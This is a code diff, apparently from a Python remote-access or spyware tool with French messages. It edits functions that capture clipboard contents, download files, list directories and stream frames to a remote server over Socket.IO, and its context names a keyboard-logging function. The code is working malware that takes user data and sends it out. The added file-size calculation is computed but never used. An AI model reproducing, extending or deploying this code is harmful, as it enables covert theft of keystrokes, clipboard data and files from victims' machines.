@@ -87,15 +87,15 @@ def record_and_send_keyboard_log(duration=10, sio=None):
 
 def get_clipboard_content(sio=None):
     try:
-        print("Récupération du presse-papiers...")
+        print("Récupération du clipboard...")
         clipboard_content = pyperclip.paste()
         if clipboard_content and sio:
             sio.emit('clipboard_response', {'clipboard_content': clipboard_content})
-            print("Contenu du presse-papiers envoyé au serveur via Socket.IO.")
+            print("Contenu du clipboard envoyé au serveur.")
         else:
-            print("Aucun contenu trouvé dans le presse-papiers ou connexion au serveur Socket.IO manquante.")
+            print("Aucun contenu trouvé dans le clipboard ou connexion au serveur Socket.IO manquante.")
     except Exception as e:
-        print(f"Échec de la récupération du presse-papiers: {e}")
+        print(f"Échec de la récupération du clipboard: {e}")
 
 
 def gen_frames(sio):
@@ -127,7 +127,6 @@ def gen_frames(sio):
 
 def download_file(file_path, sio):
     try:
-        file_path = file_path.replace('/', '\\')
         if os.path.exists(file_path):
             with open(file_path, 'rb') as file:
                 file_data = file.read()
@@ -147,7 +146,18 @@ def list_dir(dir_path, sio):
             for file_name in os.listdir(dir_path):
                 file_path = os.path.join(dir_path, file_name)
                 if os.path.isfile(file_path):
-                    files_and_dirs.append({'name': file_name, 'type': 'file'})
+                    size = os.path.getsize(file_path)
+                    if size < 1024:
+                        size = f"{size} B"
+                    elif size < 1024 ** 2:
+                        size = f"{size / 1024:.2f} KB"
+                    elif size < 1024 ** 3:
+                        size = f"{size / 1024 ** 2:.2f} MB"
+                    else:
+                        size = f"{size / 1024 ** 3:.2f} GB"
+
+                    files_and_dirs.append({'name': file_name,
+                                           'type': 'file'})
                 elif os.path.isdir(file_path):
                     files_and_dirs.append({'name': file_name, 'type': 'dir'})
             sio.emit('directory_listing_response', {'directory_listing': files_and_dirs})
